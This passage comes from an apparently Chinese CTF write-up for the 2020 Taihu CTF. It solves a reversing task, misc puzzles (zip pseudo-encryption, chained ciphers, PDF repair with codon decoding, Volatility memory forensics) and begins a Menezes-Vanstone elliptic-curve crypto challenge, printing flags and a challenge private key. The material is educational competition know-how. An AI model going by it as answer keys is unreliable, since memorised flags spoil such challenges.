class="keyword">if</span> (a &gt; b)</span><br><span class="line">			<span class="keyword">return</span> a;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">			<span class="keyword">return</span> b;		</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span> (i = n - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (a[i][j - <span class="number">1</span>] &gt; a[i][j])</span><br><span class="line">			&#123;</span><br><span class="line">				TrEEPath[i - <span class="number">1</span>][j - <span class="number">1</span>] = <span class="string">&quot;0&quot;</span> + TrEEPath[i][j<span class="number">-1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				TrEEPath[i - <span class="number">1</span>][j - <span class="number">1</span>] = <span class="string">&quot;1&quot;</span> + TrEEPath[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">			a[i - <span class="number">1</span>][j - <span class="number">1</span>] = max(a[i][j - <span class="number">1</span>], a[i][j]) + a[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we found large number is %d\n&quot;</span>, a[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">//std::reverse(TrEEPath[0][0].begin(), TrEEPath[0][0].end());</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The path is %s with size %d\n&quot;</span>, TrEEPath[<span class="number">1</span>][<span class="number">1</span>].c_str(),TrEEPath[<span class="number">1</span>][<span class="number">1</span>].size());</span><br><span class="line">	<span class="keyword">int</span> result = walk_tree((<span class="keyword">char</span>*)TrEEPath[<span class="number">1</span>][<span class="number">1</span>].c_str());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Walk result is %d\n&quot;</span>, result);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	build_tree();</span><br><span class="line">	find_large_path();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后得到的字符串为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000100001000010100100100001000000000000100011001110111111110100010000100000001111110100111000000101110100111110010011101011111111110100010000100100111111101000010000111111111001100000011011101</span><br></pre></td></tr></table></figure>
<p>程序最后会将这192个字符传换成数字，再和内部的魔数异或:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    ++v93;</span><br><span class="line">  <span class="keyword">while</span> ( Dst[v93] );</span><br><span class="line">  <span class="keyword">if</span> ( v93 )</span><br><span class="line">  &#123;</span><br><span class="line">    v94 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v95 = <span class="number">-1</span>i64;</span><br><span class="line">      Dst[v94] ^= Dst[v94 + <span class="number">32</span>];</span><br><span class="line">      ++v94;</span><br><span class="line">      ++v0;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        ++v95;</span><br><span class="line">      <span class="keyword">while</span> ( Dst[v95] );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 &lt; v95 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>最后可以得到flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cL1m8_w17H_vm_70_h4rV357&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="omisc"><a href="#omisc" class="headerlink" title="omisc"></a>omisc</h3><p>这是一个压缩文件，直接打开需要密码，把它拖入010Editor里查看，发现是伪加密</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise1.png"></p>
<p>把图中的地方改为00就可以了，之后打开压缩包，里面有两个文件：一个是文档，一个压缩包。查看后可以发现压缩包是加密的需要密码，那么就从文档入手，文档打开如下：</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise2.png"></p>
<p>可以尝试各种解密都无法解开，可以猜测是隐藏了密钥，这是我们选中全部文本，右键字体，可以发现有内容被隐藏</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise3.png"></p>
<p>取消隐藏后，我们就发现了两行字符，考虑希尔加密，得到密钥</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise4.png"><br><img src="/2020/11/24/2020-Taihuctf-writeup/omise5.png"></p>
<p>拿到密钥后，我们再用rabbit解密，得到一串规整的字符</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise6.png"></p>
<p>这时候考虑base家族，用base32解决了</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise7.png"></p>
<p>这一看就很明显是unicode加密后的结果,解密一看很明显的佛说加密</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise9.png"></p>
<p>再次解密后就得到了密码</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise10.png"></p>
<p>打开文件是一段音频，我们考虑音频隐写，利用Audacity打开，查看频谱图就可以得到flag</p>
<p><img src="/2020/11/24/2020-Taihuctf-writeup/omise11.png"></p>
<p>就结束啦</p>
<h3 id="broken-secret"><a href="#broken-secret" class="headerlink" title="broken_secret"></a>broken_secret</h3><p>首先打开pdf报错会发现里面的obj全部都变成了@bj</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 0 @bj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Type &#x2F;Catalog</span><br><span class="line">    &#x2F;AcroForm 5 0 R</span><br><span class="line">    &#x2F;Pages 2 0 R</span><br><span class="line">    &#x2F;NeedsRendering false</span><br><span class="line">    &#x2F;Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        &#x2F;ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            &#x2F;ExtensionLevel 3</span><br><span class="line">            &#x2F;BaseVersion &#x2F;1.7</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">end@bj</span><br></pre></td></tr></table></figure>

<p>将这一步修复好之后，使用pdfstreamdumper就能够查看内部的内容了:<br><img src="/2020/11/24/2020-Taihuctf-writeup/pdfstreamdumper.png"><br>不过发现这里存在两个object，其中一个里面写了很多文字，另一个则是一个图片，看上去被js加密了，所以我们这里需要想办法将图片解密开来。一种办法是直接将这段代码dump出来，或者我们可以选择修复pdf。如果我们现在尝试打开pdf的话，会发现此时打印的是一段假的flag，提示我们要去寻找入口。此时会发现xfa没有发生渲染，注意到在obj1中的render为false，我们需要改成true：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 0 0bj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Type &#x2F;Catalog</span><br><span class="line">    &#x2F;AcroForm 5 0 R</span><br><span class="line">    &#x2F;Pages 2 0 R</span><br><span class="line">    &#x2F;NeedsRendering true</span><br><span class="line">    &#x2F;Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        &#x2F;ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            &#x2F;ExtensionLevel 3</span><br><span class="line">            &#x2F;BaseVersion &#x2F;1.7</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">end0bj</span><br></pre></td></tr></table></figure>
<p>之后尝试打开pdf，就能见到一段和protein介绍有关的内容，这段内容提示了之后图片的含义，这里先记下来<br><img src="/2020/11/24/2020-Taihuctf-writeup/protein.png"><br>之前我们注意到，还有一个对象，但是引用表中，有效的只有6项，第七个obj展示不出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000 65535 f </span><br><span class="line">0000000019 00000 n </span><br><span class="line">0000000137 00000 n </span><br><span class="line">0000000336 00000 n </span><br><span class="line">0000000487 00000 n </span><br><span class="line">0000000706 00000 n </span><br><span class="line">0000000732 00000 n </span><br></pre></td></tr></table></figure>
<p>这里有一个小技巧，这里把第7个obj的编号改成6，即可展示6的图片~<br><img src="/2020/11/24/2020-Taihuctf-writeup/broken2.png"><br>根据前面对文章dna=&gt;rna=&gt;protein的描述<br>，每3个密码子可以编码为一个氨基酸，每种氨基酸都有一个英文字母的缩写，刚好有二十来种，起源于一张老图如下<br><img src="/2020/11/24/2020-Taihuctf-writeup/broken1.jpg"><br>例如其中的最开始的CAU，对应的就是CAT（同CAU-组氨酸)，为H，故有HAPPYNEWYEAR<br><img src="/2020/11/24/2020-Taihuctf-writeup/broken3.jpg"><br>我们拿出基因序列为<br><code>AUCUAGAGGGAAGCUCUGCUGUACUAGAUGAUUUCGUCGUAGACUCACGAAUAGGAACUGGAUGAAAGGUAGGAUGCUUAC</code><br>可以在线解密<a target="_blank" rel="noopener" href="https://skaminsky115.github.io/nac/DNA-mRNA-Protein_Converter.html">https://skaminsky115.github.io/nac/DNA-mRNA-Protein_Converter.html</a>也可以用脚本写翻译脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python program to conver </span></span><br><span class="line"><span class="comment"># altered DNA to protein </span></span><br><span class="line">  </span><br><span class="line">seq = <span class="string">&quot;AUCUAGAGGGAAGCUCUGCUGUACUAGAUGAUUUCGUCGUAGACUCACGAAUAGGAACUGGAUGAAAGGUAGGAUGCUUAC&quot;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate</span>(<span class="params">seq</span>):</span> </span><br><span class="line">    table = &#123; </span><br><span class="line">        <span class="string">&#x27;AUA&#x27;</span>:<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;AUC&#x27;</span>:<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;AUU&#x27;</span>:<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;AUG&#x27;</span>:<span class="string">&#x27;M&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;ACA&#x27;</span>:<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;ACC&#x27;</span>:<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>:<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;ACU&#x27;</span>:<span class="string">&#x27;T&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;AAC&#x27;</span>:<span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;AAU&#x27;</span>:<span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;AAA&#x27;</span>:<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;AAG&#x27;</span>:<span class="string">&#x27;K&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;AGC&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;AGU&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;AGA&#x27;</span>:<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;AGG&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,  </span><br><span class="line">        <span class="string">&#x27;CUA&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;CUC&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;CUG&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;CUU&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;CCA&#x27;</span>:<span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;CCC&#x27;</span>:<span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;CCG&#x27;</span>:<span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;CCU&#x27;</span>:<span class="string">&#x27;P&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;CAC&#x27;</span>:<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;CAU&#x27;</span>:<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;CAA&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;CAG&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;CGA&#x27;</span>:<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;CGC&#x27;</span>:<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;CGG&#x27;</span>:<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;CGU&#x27;</span>:<span class="string">&#x27;R&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;GUA&#x27;</span>:<span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;GUC&#x27;</span>:<span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;GUG&#x27;</span>:<span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;GUU&#x27;</span>:<span class="string">&#x27;V&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;GCA&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;GCC&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;GCG&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;GCU&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;GAC&#x27;</span>:<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;GAU&#x27;</span>:<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;GAA&#x27;</span>:<span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;GAG&#x27;</span>:<span class="string">&#x27;E&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;GGA&#x27;</span>:<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;GGC&#x27;</span>:<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;GGG&#x27;</span>:<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;GGU&#x27;</span>:<span class="string">&#x27;G&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;UCA&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;UCC&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;UCG&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;UCU&#x27;</span>:<span class="string">&#x27;S&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;UUC&#x27;</span>:<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;UUU&#x27;</span>:<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;UUA&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;UUG&#x27;</span>:<span class="string">&#x27;L&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;UAC&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;UAU&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;UAA&#x27;</span>:<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;UAG&#x27;</span>:<span class="string">&#x27;_&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;UGC&#x27;</span>:<span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;UGU&#x27;</span>:<span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;UGA&#x27;</span>:<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;UGG&#x27;</span>:<span class="string">&#x27;W&#x27;</span>, </span><br><span class="line">            &#125; </span><br><span class="line">    protein =<span class="string">&quot;&quot;</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(seq)%<span class="number">3</span> == <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seq), <span class="number">3</span>): </span><br><span class="line">            codon = seq[i:i + <span class="number">3</span>] </span><br><span class="line">            protein+= table[codon] </span><br><span class="line">    <span class="keyword">return</span> protein </span><br><span class="line">print(translate(seq))</span><br><span class="line"><span class="comment">#flag&#123;I_REALLY_MISS_THE_ELDER_DAY&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p>出题出的太快了没出好给师傅们道歉。。<br>首先简单分析一下内存:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (F:\Taihu_MISC\dump)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x185000L</span><br><span class="line">                          KDBG : 0x8297ac28L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0x8297bc00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2020-11-04 16:14:45 UTC+0000</span><br><span class="line">     Image local date and time : 2020-11-05 00:14:45 +0800</span><br></pre></td></tr></table></figure>
<p>发现是win7，稍微搜索一下磁盘，发现一个可疑文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000003fdf6118      8      0 RWD--- \Device\HarddiskVolume1\Users\link3\Desktop\Untitled.png</span><br></pre></td></tr></table></figure>
<p>结合题目的提示，dll管家就是dllhost。win7的图片管理器其实也是由dllhost拉起来的，而这个进程还在运行，那么猜测可能是打开了这个文件，于是将当前进程dump下来:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f dump --profile&#x3D;Win7SP1x86_23418 memdump -p 3148 -D .&#x2F;test</span><br></pre></td></tr></table></figure>
<p>用gimp强行查看，可以得到图片<br><img src="/2020/11/24/2020-Taihuctf-writeup/wp01.png"><br>最后几个字符看的不是很清楚，不过注意到提示里面的<code>[ans]</code>，所以可以猜测最后的flag为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;From_Mem_to_find_ans&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h3><p>这个题目的加密算法其实是老算法<code>Menezes-Vanstone cryptosystem</code></p>
<h4 id="解析椭圆曲线"><a href="#解析椭圆曲线" class="headerlink" title="解析椭圆曲线"></a>解析椭圆曲线</h4><p>首先，要能够成功用openssl解析证书，才能够知道这个椭圆曲线的参数。解析的指令为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl ec -in p384-key.pem -text</span><br></pre></td></tr></table></figure>
<p>输出的内容为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Private-Key: (384 bit)</span><br><span class="line">priv:</span><br><span class="line">    e0:5b:05:a4:d6:c3:36:fb:a9:34:6a:64:93:2f:14:</span><br><span class="line">    5a:4c:89:d6:41:a0:7a:4c:dd:a1:85:da:ed:a7:94:</span><br><span class="line">    3f:a0:dc:c2:42:88:20:cc:7f:f7:64:4d:81:79:17:</span><br><span class="line">    eb:ca:ce</span><br><span class="line">pub:</span><br><span class="line">    04:86:25:db:50:57:80:51:60:3a:33:67:9d:dc:3a:</span><br><span class="line">    47:25:8f:38:55:3f:22:84:0d:70:76:a2:f8:e2:02:</span><br><span class="line">    96:da:56:88:6a:7e:2e:24:0f:cf:0b:57:75:f4:74:</span><br><span class="line">    ca:0b:06:90:b0:41:c4:46:ff:ef:03:ae:4b:3e:62:</span><br><span class="line">    2f:5b:99:64:9a:26:41:72:e7:df:a8:5b:5c:e8:74:</span><br><span class="line">    68:ac:43:6e:67:9f:31:a7:92:ae:88:30:41:4e:81:</span><br><span class="line">    51:5d:dc:61:db:c7:08</span><br><span class="line">Field Type: prime-field</span><br><span class="line">Prime:</span><br><span class="line">    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:</span><br><span class="line">    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:</span><br><span class="line">    ff:ff:fe:ff:ff:ff:ff:00:00:00:00:00:00:00:00:</span><br><span class="line">    ff:ff:ff:ff</span><br><span class="line">A:</span><br><span class="line">    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:</span><br><span class="line">    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:</span><br><span class="line">    ff:ff:fe:ff:ff:ff:ff:00:00:00:00:00:00:00:00:</span><br><span class="line">    ff:ff:ff:fc</span><br><span class="line">B:</span><br><span class="line">    00:b3:31:2f:a7:e2:3e:e7:e4:98:8e:05:6b:e3:f8:</span><br><span class="line">    2d:19:18:1d:9c:6e:fe:81:41:12:03:14:08:8f:50:</span><br><span class="line">    13:87:5a:c6:56:39:8d:8a:2e:d1:9d:2a:85:c8:ed:</span><br><span class="line">    d3:ec:2a:ef</span><br><span class="line">Generator (uncompressed):</span><br><span class="line">    04:aa:87:ca:22:be:8b:05:37:8e:b1:c7:1e:f3:20:</span><br><span class="line">    ad:74:6e:1d:3b:62:8b:a7:9b:98:59:f7:41:e0:82:</span><br><span class="line">    54:2a:38:55:02:f2:5d:bf:55:29:6c:3a:54:5e:38:</span><br><span class="line">    72:76:0a:b7:36:17:de:4a:96:26:2c:6f:5d:9e:98:</span><br><span class="line">    bf:92:92:dc:29:f8:f4:1d:bd:28:9a:14:7c:e9:da:</span><br><span class="line">    31:13:b5:f0:b8:c0:0a:60:b1:ce:1d:7e:81:9d:7a:</span><br><span class="line">    43:1d:7c:90:ea:0e:5f</span><br><span class="line">Order:</span><br><span class="line">    00:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:</span><br><span class="line">    ff:ff:ff:ff:ff:ff:ff:ff:ff:ff:c7:63:4d:81:f4:</span><br><span class="line">    37:2d:df:58:1a:0d:b2:48:b0:a7:7a:ec:ec:19:6a:</span><br><span class="line">    cc:c5:29:73</span><br><span class="line">Cofactor:  1 (0x1)</span><br><span class="line">Seed:</span><br><span class="line">    a3:35:92:6a:a3:19:a2:7a:1d:00:89:6a:67:73:a4:</span><br><span class="line">    82:7a:cd:ac:73</span><br></pre></td></tr></table></figure>
<p>这里可以知道，priv的值为<code>0xe05b05a4d6c336fba9346a64932f145a4c89d641a07a4cdda185daeda7943fa0dcc2428820cc7ff7644d817917ebcace</code>，pubkey的开头值为<code>04</code>，表示之后的84个数字从中间分成两份，分别表示公钥中的两个点。这里我们能够知道生成元为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G(0xAA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7,0x3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F)</span><br></pre></td></tr></table></figure>
<p>然后可以直接用椭圆曲线的公式:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pubkey&#x3D;G*PrivKey</span><br></pre></td></tr></table></figure>
<p>算出来。</p>
<h4 id="Menezes-Vanstone-加密"><a href="#Menezes-Vanstone-加密" class="headerlink" title="Menezes-Vanstone 加密"></a>Menezes-Vanstone 加密</h4><p>其实这里使用的就是<code>Menezes-Vanstone</code>加密算法。如果能够在网上搜到的话应该可以找到更加相信的数学说明。（PS：密码学的课本上也有这个算法）</p>
<p>看到给出的加密公式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x1 &#x3D; int(codecs.encode(flag[:12],&#39;hex&#39;),16)</span><br><span class="line">x2 &#x3D; int(codecs.encode(flag[12:],&#39;hex&#39;),16)</span><br><span class="line">X &#x3D; (x1,x2)</span><br><span class="line">k &#x3D; randrange(1, n-1)</span><br><span class="line">y0 &#x3D; k*generator_384</span><br><span class="line">KPoint &#x3D; k*PubKey</span><br><span class="line">Y &#x3D; (X[0] * KPoint.x() % _p, X[1]*KPoint.y() % _p)</span><br></pre></td></tr></table></figure>
<p>这里的<code>y0</code>和<code>Y</code>都是已知的。X是明文，用公式写起来就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y0&#x3D;(k*Genrator.x, k*Genrator.y)</span><br><span class="line">(Kpoint.x, Kpoint.y)&#x3D;(Pubkey.x*k, Pubkey.y*k)</span><br><span class="line">Y[0] &#x3D; X[0]*Kpoint.x mod _p</span><br><span class="line">Y[1] &#x3D; X[1]*Kpoint.x mod _p</span><br></pre></td></tr></table></figure>
